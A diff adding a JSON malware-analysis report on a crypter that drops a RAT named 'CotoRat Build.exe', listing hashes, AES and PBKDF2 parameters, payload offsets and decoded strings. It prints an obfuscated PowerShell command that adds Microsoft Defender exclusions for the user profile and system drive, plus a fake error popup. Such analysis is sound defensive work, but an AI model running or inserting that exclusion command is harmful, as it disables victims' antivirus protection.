@@ -1,0 +1,41 @@
+{
+  "crypter": {
+    "sha256": "27a2505cfd32ca1fda31e58c1d2ddee7e4726b8305fda10b779851e259a2ef9d",
+    "md5": "4e4f12fc574559e8bf84bfe074f4cad5",
+    "size": 930304,
+    "aes_key": "917c288da08c36158a03ec405bb04140",
+    "pbkdf2_password_length": 256,
+    "pbkdf2_salt": "erytiqjdxdutsqckdapnnhprdujedlpd",
+    "pbkdf2_iterations": 100,
+    "iv": "xbginlypryzblkfy"
+  },
+  "decoded_strings": {
+    "process": "powershell",
+    "env_var": "Temp",
+    "payload1_name": "CotoRat Build.exe",
+    "payload2_name": "knb3ewbfwxnbt1sc.exe",
+    "exec_flag": "true"
+  },
+  "powershell_commands": [
+    "<#mes#>Add-Type -AssemblyName System.Windows.Forms;<#plk#>[System.Windows.Forms.MessageBox]::Show('Error 0x00005','','OK','Error')<#ryw#>",
+    "<#rus#>Add-MpPreference <#kgg#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#wjh#> -Force <#lyn#>"
+  ],
+  "payloads": [
+    {
+      "offset": "0x0005aa",
+      "encrypted_size": 384528,
+      "decrypted_size": 384512,
+      "sha256": "710e3226b214aa6d3ab65bb3d8899ea533bdfc6da28602328c5912567c9bcf0c",
+      "md5": "50a2abc3ddd1355f112500eb2ed2814a",
+      "is_pe": true
+    },
+    {
+      "offset": "0x05e3bf",
+      "encrypted_size": 537104,
+      "decrypted_size": 537088,
+      "sha256": "3ac847a0e3137b7fe4b83a677bbb68ac2fa5043e276fa44d13b6c58be189f943",
+      "md5": "bbebbb015db3b3371405a09b7dab4e73",
+      "is_pe": true
+    }
+  ]
+}
